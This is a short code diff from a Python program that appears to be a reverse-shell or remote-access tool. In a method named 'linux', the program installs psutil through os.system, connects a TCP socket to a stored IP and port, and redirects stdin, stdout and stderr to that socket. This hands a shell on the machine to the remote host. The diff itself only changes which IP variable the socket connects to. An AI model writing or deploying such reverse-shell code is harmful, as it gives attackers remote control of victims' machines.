@@ -60,7 +60,7 @@ class Details:
     def linux(self):
         os.system("pip install psutil")
         s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-        s.connect((self.ip,self.port))
+        s.connect((self.start_Ip,self.port))
         os.dup2(s.fileno(),0)
         os.dup2(s.fileno(),1)
         os.dup2(s.fileno(),2)
